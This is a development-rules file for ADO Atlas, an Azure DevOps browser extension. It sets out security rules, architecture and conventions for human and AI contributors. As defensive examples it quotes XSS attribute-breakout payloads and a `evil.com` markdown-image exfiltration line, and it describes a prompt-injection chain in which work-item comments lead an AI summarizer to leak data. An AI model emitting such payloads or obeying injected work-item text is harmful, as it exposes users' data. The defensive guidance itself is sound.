# ADO Atlas — Development Rules

Rules for anyone (human or AI agent) writing code in this repo.

**How to read this file.** Part I is non-negotiable: violating it leaks user data, loses
their work, or gets us pulled from the Chrome Web Store. Every rule there cites a real bug
that was actually found in this codebase — they are not hypotheticals, and that is why they
are rules and not suggestions. Part II is the architecture you must work within. Part III is
process.

Full audit and reasoning: [`docs/audit-2026-07/`](../docs/audit-2026-07/).

---

# Part I — Non-negotiables

## 1. Treat these three sources as hostile

Everything from these three places is attacker-controlled. Not "in theory" — in the normal
operation of the product:

| Source | Why it's hostile |
|---|---|
| **Work-item content** (titles, descriptions, comments, tags, display names) | Written by **other people in the ADO organization**. This is not self-XSS: the attacker is not the victim. |
| **AI/model output** | The model reads work-item content, so a prompt injection planted in a comment becomes model output. |
| **User preferences that hold URLs** (custom emoji, custom AI endpoint) | Self-inflicted, but must not break the page. |

### 1.1 Never interpolate untrusted data into `innerHTML` unescaped

```js
// WRONG — a work item titled `<img src=x onerror=...>` executes
el.innerHTML = `<div>${item.title}</div>`;

// RIGHT
el.innerHTML = `<div>${htmlEsc(item.title)}</div>`;
// or, better, when there's no markup to build:
el.textContent = item.title;
```

`htmlEsc` is a bare global from `lib.js` and covers `& < > " '`. **Escape inside attributes
too** — a prefix check is not a validator:

> **Real bug (C24).** `renderEmojiMarkup` did `src="${emojiVal}"` after testing that the
> value *starts with* `icons/`. The value `icons/x" onerror="alert(1)` passes that test and
> breaks straight out of the attribute.

### 1.2 AI output is untrusted — render it with images disabled

```js
// RIGHT — the only correct way to render model output
el.innerHTML = AdoLib.mdToHtml(modelOutput, { allowImages: false });
```

> **Real bug (C38a, high).** `mdToHtml` defaults to `allowImages: true`, and the manifest CSP
> declares **no `img-src`**. So: someone plants a prompt injection in a work-item comment →
> the user clicks Summarize → the model emits `![](https://evil.com/?d=<leaked content>)` →
> the browser fetches it → **the work item is exfiltrated to an attacker's host**. The strict
> `connect-src` doesn't help at all, because the leak travels over `<img>`, not `fetch`.
> There is no XSS here, which is exactly why it was nearly missed.

Rule: **any** channel that renders model output must pass `{ allowImages: false }`. Use the
`renderAiMarkdown()` helper in `ai-summarizer.js` as the pattern. A summary never needs images.

If you ever add `img-src` to the CSP, this rule still stands — defense in depth, not either/or.

### 1.3 Never `innerHTML` a raw string as a fallback

```js
// WRONG — if AdoLib fails to load, raw model output becomes HTML
const md = AdoLib?.mdToHtml ?? (s => s);
el.innerHTML = md(text);

// RIGHT — degrade to text, never to HTML
if (AdoLib?.mdToHtml) el.innerHTML = AdoLib.mdToHtml(text, { allowImages: false });
else el.textContent = text;
```

### 1.4 `mdToHtml` escapes *before* transforming — don't break that

`lib.js:210` escapes first (`h(t)`), then applies markdown regexes, and `LINK_RE` requires
`https?://` so `javascript:` can't get through. This ordering **is** the security property.
If you touch that function, keep escape-first, and add your case to the fuzz vectors in
`tests/lib.test.js`.

## 2. Never write to ADO without a revision test

```js
// WRONG — silently overwrites whatever a colleague just changed
ops.push({ op: 'add', path, value });

// RIGHT — first op is always the revision test
const ops = [{ op: 'test', path: '/rev', value: rev }, ...fieldOps];
```

On `HTTP 409`, show a conflict dialog ("changed by someone else — reload / overwrite").
Do **not** swallow it.

> **Real bug (C04).** `updateItem` and bulk edits sent PATCH without `test /rev` — while
> `setParent` and `addDependency`, in the same file, did it correctly, and the editor already
> stored `rev` (`editor.js:444`). Result: edit the same item in the ADO portal in another tab,
> and your change is silently erased. No error, no conflict, no way to notice.

## 3. Never auto-retry a non-idempotent request

`GET` / `PUT` / `DELETE` retry freely. `PATCH` retries **only** when it carries `test /rev`
(then a stale retry fails loudly with 409 instead of clobbering). **`POST` is never retried
automatically** — offer the user a retry instead.

> **Real bug (C05).** `req()` retried every method. If the server created the item but the
> response was lost (dropped connection, 502 after the write), the retry created a **second
> item**. Same for comments and sprints. The user gets a silent duplicate and no explanation.

## 4. Distinguish "no data" from "failed"

```js
// WRONG — 403 / 404 / network error all become "there are no sprints"
async function iterations() {
  try { return await req(...); } catch (_) { return []; }
}
```

An empty `catch` that returns a neutral value **lies to the user**. They see a board with no
sprints and conclude there are none; in fact they lack permission, and they will never find out.

Empty `catch` is acceptable **only** for genuinely best-effort work: telemetry,
`revokeObjectURL`, analytics. Everywhere else, propagate the failure or return
`{ data, error }` and surface it.

**Undo/redo is the worst case:** never report success unconditionally.

> **Real bug (C20).** `bulk.js:148` — `try { await api.setParent(...) } catch(e) {}` followed
> by an unconditional `afterUndo(null)`. The API call fails, the UI says "undone", and local
> state now silently disagrees with the server.

## 5. Secrets never touch `App.prefs`

PATs, OAuth tokens, AI API keys, license keys live in `chrome.storage.local` and are **never**
registered in the `App.prefs` REGISTRY. `export()` only emits `scope:'sync'` keys.

This is enforced by `tools/check-prefs.js` — **keep it that way**. It is one of the genuinely
strong parts of this codebase; do not weaken it for convenience.

## 6. Don't ship a price tag for something that doesn't exist

A `PRO` badge, a paywall, or a price on a feature that isn't implemented is not just bad UX —
it is a Chrome Web Store policy risk ("misleading functionality"), and the Store is our
**only** sales channel.

If it isn't built: no badge, no price, no paywall. Label it "Roadmap", or hide it behind
`PREMIUM_STAGE`.

---

# Part II — Architecture

## 7. Global scope & the collision guard

Classic `<script>` tags in `index.html` share one global scope. There is no bundler, **by
design** (zero build step, instant debugging, no npm supply chain). The cost is that the
compiler catches nothing — so we pay it deliberately:

- Wrap modules in an IIFE: `(function(global){ 'use strict'; ... })(globalThis)`.
- Export explicitly: `global.MyComponent = MyComponent`.
- **If a symbol is already called bare from an untouched module, keep it bare.** Relocate the
  file, don't namespace it. Namespacing pervasive infra (`$`, `api`, `AdoLib`, `htmlEsc`) is
  churn with no benefit.
- **Every new `src/**/*.js` must be added to `index.html`** (and `background.js` importScripts
  if the worker needs it).
- Avoid **parse-time side effects**. Top-level code that calls into another file creates a TDZ
  trap that no check will catch. Do the work in an explicit `init()`.

> `tools/check-globals.js` scans `src/` **recursively** — you do **not** need to register files
> in it. It catches duplicate top-level names and syntax errors, and **nothing else**: not load
> order, not missing script tags, not TDZ. Assume it will not save you.

## 8. `lib.js` is pure — keep it that way

Only pure, deterministic, dependency-free functions. No DOM, no `chrome.*`, no `fetch`.
It must run in plain Node, because that's what makes it testable.

**This is the main lever for testability in this codebase.** When you touch a big stateful
module, look for a pure kernel to lift out into `lib.js` and unit-test. That is how ~20k lines
of untested imperative code gets covered — incrementally, not in one heroic pass.

## 9. Filter IR — one query model

Quick chips, the filter builder, and AI natural-language search all emit the same `FilterIR`.
It uses vendor-neutral keys (`state`, `assignee`, `storypoints`), never `System.State`.
Compiling `FilterIR` → WIQL lives **only** in `FilterCompiler` / `buildClauses`.

This is what keeps a future Jira/GitHub backend possible. Keep the discipline even though the
second backend isn't being built this year.

## 10. AI provider abstraction

Never bind a feature to a concrete model or endpoint. Go through `aiProviderRegistry.getActive()`
and the `AIProvider` interface (`prompt()`, `promptJSON()`). New AI features live in `src/ai/`
as standalone components with a minimal public surface.

**Cost awareness:** the multi-pass pipeline was designed for free on-device Gemini Nano, but the
same passes run against the user's **paid** BYOK key. Don't add passes without considering who
pays for them, and give every network call a timeout and an `AbortController`.

## 11. `LayerManager` owns stacking *and* focus

Every overlay, modal, popover and dropdown goes through `LayerManager.open()` / `.close()`.
Never hardcode `z-index`.

When you add an overlay, it must also:
- have `role="dialog"` `aria-modal="true"` `aria-labelledby="<its title id>"`;
- trap focus (Tab must not escape behind the backdrop);
- return focus to the trigger on close.

> The project currently has **2** `aria-*` attributes and **0** `role=` across all of `src/` +
> `index.html`. Don't add to that number. Fixing this centrally in `LayerManager` covers every
> overlay at once.

## 12. Theme via tokens

Colors, backgrounds, borders, shadows, text: use CSS variables (`var(--bg)`, `var(--panel)`,
`var(--line)`, `var(--txt)`, `var(--accent)`…). Light theme = `.light` on `<body>`, set early
by `theme-init.js` to avoid FOUC.

Nuance, so this rule isn't cargo-culted: **surfaces, text and borders must be tokens**. Brand
colors, semantic state colors (danger/success/warn) and `color:#fff` on a saturated fill are
*theme-invariant by design* and don't need a `body.light` override. The genuine gap is that
state colors are repeated as literals — prefer `--danger` / `--success` / `--warn` over a
fifth copy of `#e74c3c`.

## 13. Async render tokens

For async render pipelines (graph, board, sidebar), capture a token before the await and bail
if it changed:

```js
const my = ++renderToken;
const data = await load();
if (my !== renderToken) return;   // superseded — drop stale result
```

Cancel in-flight requests with `AbortController` when the context changes.

## 14. All ADO requests go through `req()`

`req()` in `src/core/api/` centralizes retry/backoff (429 with `Retry-After`, transient 5xx),
sets `X-TFS-FedAuthRedirect: Suppress` so auth failure is a clean `401` instead of a native
browser credential prompt, and dispatches the `ado-401` event that reopens setup.

Respect §3: retry only what is safe to retry.

**Token refresh must be single-flight.** `authHeader()` runs on every request, and requests run
in pools — so N parallel requests at the expiry boundary will each call `oauthRefresh()` with
the same single-use refresh token. Entra rotates it; one wins, the rest get `invalid_grant`
and the user is logged out mid-session. Cache the in-flight promise (like `populatePromise`).

## 15. Caching

Two layers: in-memory for the session, `chrome.storage.local` for persistence.

- **Schema caches need a TTL.** Without one, a new state or field in the ADO process never
  appears until the user manually clears storage.
- **`setConfig` must invalidate storage keys, not just memory** — otherwise switching projects
  serves the previous project's schema.
- **Don't persist raw `fields`** into the snapshot; store only what the render needs
  (`id`, `type`, `title`, `state`, `parent`, `rev`). The full payload hits the storage quota,
  `set()` throws, the error is swallowed, and the instant-first-paint feature silently dies.

## 16. Feature gating goes through `gate()`

```js
// RIGHT — the ONLY correct gate
if (!EntitlementManager.gate('analytics')) return;
```

`gate()` handles all three tiers (free → paywall, preview → limited, pro → through) and honours
the grace period. Do **not** hand-roll `isPro()` checks at call sites, and do **not** intercept
clicks globally.

`ProButtonManager.TIERS` is the **single source of truth** for a feature's tier. Never hardcode
`pro-glow` / `pro-preview` in `index.html`. Every `data-pro-feature` must exist in `TIERS` and
in `PremiumPaywall.FEATURES`.

> **Real bug (C14, high).** `gate()` was written and **never called once**. `init.js:281`
> intercepted every `[data-pro-feature]` click and opened the paywall **without checking
> `isPro()`** — so a paying customer would hit the same paywall as a free user. The entire
> three-tier model existed only on paper.

## 16b. A persisted Pro value needs an entitlement guard

`gate()` answers **"may the user do this now?"** — it is for an action, and it opens a paywall.
It says nothing about a value the user already saved. A subscription lapses **between**
sessions, or mid-session when the background alarm revalidates, and nothing re-checks
`theme: 'ultra'` sitting in `App.prefs`.

So: **any feature that persists a value the user had to be entitled to must register a guard.**
Themes, conditional-formatting rules, task templates, saved filter presets — all of them.

```js
// RIGHT — the feature declares how to fall back; the manager owns WHEN it runs
EntitlementManager.registerGuard('theme', () => {
  if (isThemeAllowed(current)) return null;        // nothing to do
  App.prefs.set('theme', THEMES[current].base);    // revert to a free value
  applyTheme(THEMES[current].base);
  return themeName(current);                       // label, for one aggregated notice
});
```

Rules for a guard:

- **It must be silent.** No paywall, no modal. Throwing a paywall at boot is hostile — the
  user did not just click anything. Use a plain entitlement test (`isPro()` / `isPreview()`),
  never `gate()`.
- **Fall back to the nearest free value, not to the global default.** Someone on the Paper
  theme chose a *light* interface; reverting them to `dark` would be a worse bug than the one
  you are fixing. Revert `paper → light`, `ultra → dark`.
- **Persist the fallback**, so the pre-paint path (`theme-init.js` and friends) reads a clean
  value next boot and nothing flashes.
- **Return a short label** for what you reverted, or `null`. `init.js` aggregates them into a
  single notice — a user whose subscription lapsed does not want three separate toasts.
- Do **not** wire `onChange()` yourself. `EntitlementManager` runs every guard at boot and on
  every entitlement change; that is the whole point. Wiring it by hand is how the next feature
  quietly forgets.

> Without this, an expired subscriber keeps the paid feature **forever** — and you would not
> notice, because while a feature sits at tier `preview` everyone is entitled anyway. The bug
> only detonates on the day you flip it to `'pro'`.

## 16c. Never clip a Pro host — the badge overhangs on purpose

`ProButtonManager.apply()` injects `.pro-badge-auto` pinned to the host's **corner, outside its
box** (`top: -0.385rem; right: -0.385rem`). That overhang is the design. So:

**Never put `overflow: hidden` (or `clip-path`) on a `[data-pro-feature]` element, or on any
ancestor between it and the badge.** The badge is the first thing to disappear, and it
disappears silently — the button still looks fine, it just stops saying PRO.

```css
/* WRONG — clips the badge off the corner */
.theme-card.pro-glow { overflow: hidden; }

/* RIGHT — nothing to clip in the first place */
.theme-card .theme-swatch { position: relative; z-index: 1; }  /* just sit above the shimmer */
```

**The shimmer does not need clipping.** This trips people up, so it is worth stating plainly:
`.pro-glow::before` / `.pro-preview::before` is an `inset: 0` layer with `border-radius: inherit`,
animated by moving a **`background-position`**, not a `transform`. It is geometrically incapable
of leaving the host's box. Reaching for `overflow: hidden` to "contain the glow" contains
nothing and breaks the badge. The comment above that rule in `premium.css` says exactly this —
read it before you add an overflow.

Watch for these too, because they clip without the word `overflow` appearing anywhere near the
Pro element:

- **Scroll containers.** `overflow-y: auto` forces `overflow-x` to compute to `auto` as well, so
  a vertically scrolling panel clips horizontally too. Keep enough padding that the overhang
  (~2px) stays inside the padding box.
- **Segmented controls / pills** with a rounded, clipped track — a Pro button dropped into one
  loses its badge to the track's own `overflow`. (There is already a commit in this repo whose
  entire subject is fixing this: *"prevent badge clipping"*.)
- `transform` / `filter` / `contain` on an ancestor create a containing block, which changes
  what the absolutely-positioned badge anchors to.

If a layout genuinely cannot give the badge room, move the badge **inside** the box for that
host (`top: 2px; right: 2px`) rather than clipping the host. Do not delete the badge.

## 17. Localization

Every user-facing string goes through `window.i18n.t(key, params)` — **including strings built
in JS**. Static DOM uses `data-i18n` / `data-i18n-title`.

> The setup screen — the **first thing every user sees**, and the gate to the whole app — is
> still hardcoded English, as are the command palette and the tutorial chrome. `setup.js:51`
> even overwrites a correctly localized `data-i18n-html` with an English literal.

RTL is **not supported** (`RTL_LANGS` is empty, layout uses physical `left`/`right`). Don't
claim otherwise in docs.

## 18. Custom dialogs only

Never `alert()`, `confirm()`, `prompt()`. Use `customAlert` / `customConfirm`.

---

# Part III — Process

## 19. The gate

```bash
npm test    # check-globals + check-i18n-keys + check-prefs + lib + ai + api tests
```

Run it before every commit. In WSL, `npm` resolves to Windows npm on the mount; if that
misbehaves, run each script directly with `node.exe`.

**Know what the gate does *not* catch:** missing script tag, wrong load order, TDZ, a bad SVG
attribute, a broken bare reference — all invisible to it. **Any change with runtime surface
needs a manual smoke in Chrome.** There is no substitute yet.

## 20. Tests

- Zero dependencies, `node:assert`.
- **Async tests must be awaited.** A `test()` that calls `fn()` synchronously will print
  `pass` *before* the assertions run, and a failed assert lands in `unhandledRejection`
  instead of the failure count.

  > **Real bug (C29).** This is exactly what `tests/ai.test.js` does: 17 of its tests are
  > `async`, so "19 passed, 0 failed" was **not true**. A green run meant nothing.

- New pure logic → a unit test, always. Extracting a pure function from a stateful module
  and testing it is the cheapest quality win available here.
- **Money logic must be tested.** `EntitlementManager.isPro` (free / active / past_due+grace /
  expired / devForce) is nearly pure and currently has zero tests.

## 21. Don't let the docs drift

`docs/ARCHITECTURE.md` is a living reference and people trust it — which is exactly why a stale
claim there is worse than no claim. It has already drifted (load order missing three modules;
a rule telling you to register files in `check-globals`, which is false; a reference to a
`build.ps1` that doesn't exist; RTL and an analytics dashboard described as done when they
don't exist).

If you change load order, gating, or a documented invariant, update the doc **in the same
commit**.

## 22. GitHub Issues is the source of truth

Idea → Issue → branch → PR → merge → close. No `scratch/issues.txt`, no `task.md` as a
planning source of truth.

---

---

# Part IV — Codebase conventions

Rules Part I–III doesn't cover: the unwritten agreements this code already follows. Breaking
one of these doesn't leak data — it produces the quiet, hard-to-trace kind of wrong.

## 23. Ids are global ids — convert at exactly one place

The app speaks **global ids** (`"ado:123"`). The REST layer speaks **native ids** (`123`).

`src/core/api/facade.js:47` strips gids automatically — but **only for the named methods in
`ID_POS`** (`item`, `updateItem`, `setParent`, `deps`, `times`…). **`req()` and `batchUpdate()`
are raw and strip nothing.**

```js
// RIGHT — the facade converts for you
await api.updateItem(id, body);           // id may be "ado:123"

// WRONG — hand-built URL through the raw layer: ADO gets /workitems/ado:123 and 400s
uri: `/_apis/wit/workitems/${id}?api-version=7.1`

// WRONG — `| 0` on a global id silently yields 0 → PATCHes /workitems/0
url: `${projUrl}/_apis/wit/workitems/${val | 0}`

// RIGHT — if you must hand-build, convert every id
const nid = id => App.backend.nid(id);
uri: `/_apis/wit/workitems/${nid(id)}?api-version=7.1`
```

Raw ADO responses are keyed by **native** id. Keying a map from a raw response and then reading
it with a gid returns `undefined` every time — silently.

Anything **user-visible** goes through `App.backend.nid()`: `#123`, never `#ado:123`.

> **Real bug (fixed 2026-07).** The composite-id migration (`3ef041f`) removed the `+id`
> coercions from `bulk.js` but missed the three places it hand-builds URLs. Result: **every
> bulk edit** — state, priority, assignee, sprint, tags, dates, parent — sent
> `PATCH /workitems/ado:1042` and failed, and the parent path additionally looked up a
> native-keyed relations map with a gid, so the old parent link was never removed. The
> flagship bulk feature was broken by a refactor and nothing caught it: `check-globals` is
> static and there was no manual smoke. Prefer `api.*` — reach for `req()` only when no
> facade method exists, and then convert.

## 24. The mutation contract — all four steps, in order

Any code that changes a work item on the server must:

1. `await api.<mutate>(...)` — through the facade, never a hand-rolled `req()` (§23);
2. update the client mirror `App.state.store.nodes[id]` with the same semantic keys the node
   uses (`state`, `assigned`, `iteration`, …);
3. update `App.state.orig` if the side panel is open on that item — it is the pristine copy
   the dirty indicator compares against;
4. `pushAction(label, undo, redo)` **only on success**, then re-render (`renderBoard()` /
   `renderTree()` / `App.timeline.render()`), or `await refresh()` for structural changes
   (create / re-parent / delete).

`src/app/board.js:191-205` is the reference implementation — copy its shape.

Every view renders **from `App.state.store`**, never from a fresh fetch. Skip step 2 and the
next render silently shows the pre-mutation value.

`undo`/`redo` closures call `api.*` directly (they must never re-record themselves) and end with
`await afterUndo(id)`. `pushAction` **clears the redo stack** (`undo.js:15-18`) — pushing an
action you didn't actually perform destroys the user's redo history. Bulk paths push **one**
action for the whole batch, and only if at least one item succeeded.

## 25. `loadStart` / `loadEnd` are refcounted — pair them in a `finally`

The counter is global and is never reset (`loading.js:10-12`). **One missing `loadEnd()` leaves
the progress bar on for the rest of the session** — every later `loadEnd()` included, because
the count never gets back to zero.

```js
// WRONG — an early return or a throw leaks the counter forever
loadStart('saving…');
const r = await api.updateItem(id, body);
if (!r) return;
loadEnd();

// RIGHT
await withLoad('saving…', async () => { ... });   // loading.js:12 — exists, zero call sites
```

`setStatus(msg)` on success, `setStatus('ERROR: ' + e.message, true)` on failure.
**`setStatus` switches to `innerHTML` when the string contains `<ui-icon`** (`app.js:66`) —
so never pass an unescaped work-item title or display name into it (§1.1).

## 26. ADO field refnames live in `FIELD_REGISTRY`, and only in `src/core/api/`

`FIELD_REGISTRY` (`core.js:17`) is the single map from semantic key → ADO refname.

- Above `api.*` (`src/app/`, `src/components/`, `src/ai/`), address fields by **semantic key**
  (`state`, `assigned`, `iteration`, `storypoints`). **A `System.*` literal outside
  `src/core/api/` is a bug.**
- Inside the provider, resolve through `resolveField(k)` (`core.js:156`), never a hardcoded string.
- Adding a field = **one** entry in `FIELD_REGISTRY`.

```js
// WRONG — bulk.js:324, in the app layer
const path = '/fields/System.Tags';
// RIGHT
await api.updateItem(id, { tags: value });
```

## 27. HTTP 403 → `denyOnForbidden` + a session capability flag

403 is not an error to show — it is a **permanent fact about this user in this project**. Detect
it once, flip a session flag, hide the affordance, stop asking.

```js
// RIGHT — dependencies.js:104. denyOnForbidden RETURNS whether it handled it.
catch (e) { if (!denyOnForbidden(e, 'add dependencies')) setStatus('ERROR: ' + e.message, true); }

// WRONG — app.js:503 ignores the return, so the friendly message is immediately
// overwritten by "ERROR: HTTP 403…"
catch (e) { denyOnForbidden(e, 'create work items'); setStatus('ERROR: ' + e.message, true); }
```

Capability flags (`canCreateItem`, `canCreateSprint`, `canEditSprint`) are **reset on reconnect /
project switch** in `init.js:95`. Add a new flag → reset it there, or switching to a project where
the user *does* have the right leaves the button hidden.

**401 is different and event-based:** `http-auth.js:147` dispatches `ado-401`, handled once in
`app.js:550`. That is the **only** custom-event bus in this codebase. Modules otherwise talk by
direct call (`App.board.renderBoard()`). Don't introduce a second bus.

## 28. Fan-out goes through `api.pool` — never a bare `Promise.all` over ids

The limits are load-bearing, not taste:

| n | where | why |
|---|---|---|
| **3** | `batchFetch` (`query.js:26`), `times()` | *"3-wide to avoid HTTP/2 protocol errors"* — ADO drops the connection above this |
| **6** | `deps()`, `childCounts()`, and every bulk mutation | read / write fan-out |

Ids are chunked at **200** per WIQL/batch call (`chunk200`, `query.js:19`). A
`Promise.all(ids.map(...))` over a 500-item selection gets you a 429 or an HTTP/2 reset.

## 29. Module skeleton

Every file opens with a **header comment**: what it owns, which bare globals it reads *at call
time*, where it sits in the load order. This is the only load-order documentation that exists.

Two IIFE flavours, chosen by directory:

```js
// src/app/**  — App-area modules: parameter is App, ONE export object as the last statement
(function (App) { 'use strict';
  App.tree = { renderTree, currentItems };
})(window.App);

// src/core/**, src/components/**, src/ai/**  — global components
(function (global) { 'use strict';
  global.ProFeaturesPanel = ProFeaturesPanel;
})(typeof globalThis !== 'undefined' ? globalThis : window);
```

A pure module you want tested ends with the Node guard — `require()` from a test is the only way
it gets covered:
```js
if (typeof module !== 'undefined' && module.exports) module.exports = prefs;
```

Bare (non-IIFE) files exist **only** because their symbols are already called bare from untouched
modules. **A new file has no such callers, so a new file always gets an IIFE.**

## 30. DOM conventions

`$` is `getElementById`, and it takes a **bare id, not a selector** (`const.js:54`). There is no
`$$`/`qs`/`qsa`.

Element ids carry an owner prefix: `s_` side panel · `bulk_` bulk bar · `n_` new-item ·
`c_` child create · `f_` settings · `cz_` layout builder · `sp_` sprint dialog · `setup-`/`oauth-` setup.

Card pickers require the suffix contract `<base>`, `<base>_card`, `<base>_pick`, `<base>_search`,
`<base>_results`, `<base>_open` (hardcoded in `card-picker.js:14`) — name them otherwise and the
picker **silently does nothing**.

**Never inline an `<svg>`.** Add one entry to `ICONS` (`icons.js`) and use `<ui-icon name="…">`.
`connectedCallback` renders once and does **not** observe attribute changes — changing `name` at
runtime also needs `el.innerHTML = window.ICONS[name]`. An unknown name renders **silently empty**,
so typos are invisible.

CSS: kebab-case, per-component prefix (`fb-`, `ai-`, `tut-`, `cz-`, `pro-`). State is bare
adjective classes toggled from JS: `show`, `on`, `active`, `hidden`, `sel`, `dragging`.

## 31. Pref and i18n key schemes

**Prefs** (`prefs.js:60`): logical key is **camelCase, no prefix**; storage key is derived as
`ado.<key>`. Entry: `{ default, scope, area, type, mirrorLS?, storageKey?, worker? }`.

- `scope: 'sync' | 'device'` is roaming **intent**; `area: 'sync' | 'local'` is which
  chrome.storage area backs it. **They are different fields — set both.**
- `mirrorLS: true` **only** for the three prefs the pre-boot scripts read synchronously
  (`theme`, `lang`, `uiScale`).
- `storageKey` + `worker: true` **only** for keys `background.js` reads directly.
- Secrets are never registered here (§5).

**i18n keys** (`src/locales/en.json`): a **flat** dict, `namespace.section.item`, dot-separated,
camelCase segments. The namespace is the owning module (`ai.`, `filter.`, `toolbar.`, `side.`…).
`check-i18n-keys.js` fails the build on any key missing from `ru`/`es`/`de` — and on orphans in
the other direction.

`_locales/<lang>/messages.json` is **Chrome Web Store metadata only** — never put UI strings there.

## 32. Versioned cache keys — bump the version when the shape changes

```js
`global_fields_map_v4:${org}:${project}`     // endpoints.js:146
`wit_fields_v7:${org}:${project}:${wtype}`   // endpoints.js:370
'snap:v2:' + c.org + '/' + c.project         // snapshot.js:13
```

The version suffix is the **only** invalidation mechanism — there is no migration code. Change
what's stored under one of these and **bump the number in the same commit**, or every existing
install serves a stale, wrong-shaped blob forever. (`snap:` is at `v2` because the composite-id
migration changed node ids from numeric to `"ado:123"`.)

The `${org}:${project}` segment is what keeps project A's schema out of project B's UI. Any new
per-project cache key must carry it.

## 33. Dates

- **Wire format for work-item date fields is a bare `"YYYY-MM-DD"` string.** An empty string
  becomes `{op:'remove'}` — that is how a date is cleared. Iteration nodes are the exception:
  `"YYYY-MM-DDT00:00:00Z"`.
- **Display always forces UTC** (`formatDisplayDate`, `date-pickers.js:9`), or the date shifts by
  a day for half the world. Don't hand-roll a fourth copy, and never hardcode `'en-US'`.
- **Work hours have exactly one owner: the provider.** `api.getWorkHours()` / `api.setWorkHours()`
  — the setter validates and rejects `end <= start`. Re-parsing the raw `workHours` pref skips that
  validation (`editor.js:305` does, and a pref of `"17-9"` gives it a 1-hour work day).
- `tzOffset` is passed explicitly into `api.times()` / `api.timeline()` — the provider does not
  read it.

## 34. Two dialects — write the modern one

- **Legacy compressed** (`src/app/*.js`): no spaces around operators, statements packed on one line.
- **Modern spaced** (`src/components/`, `src/ai/`, `src/core/`, and newer `src/app/` files like
  `prefs.js`, `backend.js`): 2-space indent, one statement per line.

**Write the modern dialect in new code, and in new functions inside old files. Do not reformat an
existing compressed file wholesale** — it makes the diff unreviewable, and this codebase has no
compiler to catch what the reformat broke (§7).

Quotes: single in `src/app/`, double in `src/core/` — follow the file you're in. Semicolons always.
`const` by default. **Comments are in English and explain _why_ / cross-file coupling**, not _what_.

---

## Quick checklist before you open a PR

- [ ] `npm test` green — and I know it doesn't prove the app runs
- [ ] Manually smoked the change in Chrome
- [ ] New file added to `index.html` (+ `background.js` if the worker needs it)
- [ ] No unescaped untrusted data in `innerHTML`
- [ ] AI output rendered with `{ allowImages: false }`
- [ ] Writes carry `test /rev`; no POST is auto-retried
- [ ] No empty `catch` that turns a failure into "no data"
- [ ] New overlay: goes through `LayerManager`, has `role="dialog"`, traps focus
- [ ] New user-facing string: goes through `i18n.t()`
- [ ] New gated feature: uses `gate()`, is present in `TIERS`
- [ ] Feature persisting an entitled value: registers an `EntitlementManager` guard (silent, reverts to the nearest free value)
- [ ] No `overflow: hidden` / `clip-path` on a `[data-pro-feature]` host or its ancestors — it eats the PRO badge
- [ ] No price tag or PRO badge on something that isn't built
- [ ] Docs updated if a documented invariant changed
- [ ] Ids: REST goes through `api.*`; any hand-built URL converts with `App.backend.nid()`; anything user-visible shows the native id
- [ ] Mutation: `store` + `orig` updated, `pushAction` on success only, then re-render
- [ ] `loadStart` paired with `loadEnd` in a `finally` (or `withLoad`)
- [ ] No `System.*` literal outside `src/core/api/`
- [ ] 403 handled via `denyOnForbidden` (return value respected); new capability flag reset in `init.js`
- [ ] Fan-out via `api.pool` (3 reads / 6 writes), ids chunked at 200
- [ ] New file: header comment + the IIFE flavour of its directory + single export line
- [ ] New persistent cache key carries a version **and** `${org}:${project}`
